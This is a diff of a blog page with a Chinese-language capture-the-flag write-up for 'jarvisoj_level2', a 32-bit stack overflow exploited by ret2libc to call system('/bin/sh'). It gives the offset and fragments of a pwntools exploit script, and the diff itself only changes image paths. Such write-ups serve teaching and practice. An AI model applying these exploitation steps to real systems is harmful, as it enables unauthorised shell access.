@@ -36,9 +36,9 @@
 <main>
 <h1 id="jarvisoj_level2">jarvisoj_level2</h1>
 <p>32位简单栈溢出ret2libc1，无后门，但是有system、/bin/sh，构造栈帧调用system('/bin/sh')</p>
-<p><img src="D:%5CGithub%5Cmyblog%5Cstatic%5Cimages%5Cimage-20200307235200078.png" alt="image-20200307235200078"></p>
-<p><img src="D:%5CGithub%5Cmyblog%5Cstatic%5Cimages%5Cimage-20200307235111511.png" alt="image-20200307235111511"></p>
-<p><img src="D:%5CGithub%5Cmyblog%5Cstatic%5Cimages%5Cimage-20200307235435807.png" alt="image-20200307235435807"></p>
+<p><img src="/images/image-20200307235200078.png" alt="image-20200307235200078"></p>
+<p><img src="/images/image-20200307235111511.png" alt="image-20200307235111511"></p>
+<p><img src="/images/image-20200307235435807.png" alt="image-20200307235435807"></p>
 <p>栈大小0x88，可输入0x100，offset = 0x88 + 0x4（leave）</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!/usr/bin/env python2</span>
 <span style="color:#75715e">#-*-coding=UTF-8-*-</span>
@@ -55,7 +55,7 @@ payload <span style="color:#f92672">=</span> <span style="color:#e6db74"></span>
 sh<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">Input:</span><span style="color:#e6db74">&#39;</span>,payload)
 
 sh<span style="color:#f92672">.</span>interactive()
-</code></pre></div><p><img src="D:%5CGithub%5Cmyblog%5Cstatic%5Cimages%5Cimage-20200307235621914.png" alt="image-20200307235621914"></p>
+</code></pre></div><p><img src="/images/image-20200307235621914.png" alt="image-20200307235621914"></p>
 
 </main>
 
